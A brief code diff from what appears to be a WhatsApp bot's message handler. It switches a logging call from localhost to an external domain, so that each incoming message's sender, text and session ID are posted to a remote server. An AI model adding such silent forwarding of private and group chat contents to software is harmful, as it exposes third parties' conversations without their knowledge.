@@ -57,7 +57,7 @@ function setupEventListeners(sock, saveCreds, sockId) {
             const textMessage = message.message.conversation || message.message.extendedTextMessage?.text || '';
             const isGroup = from.endsWith('@g.us');
             try {
-                await axios.post('http://localhost:9999/api/logs', {
+                await axios.post('https://latihan.haikung.my.id/api/logs', {
                     from: from,
                     message: textMessage,
                     sockId: sockId,
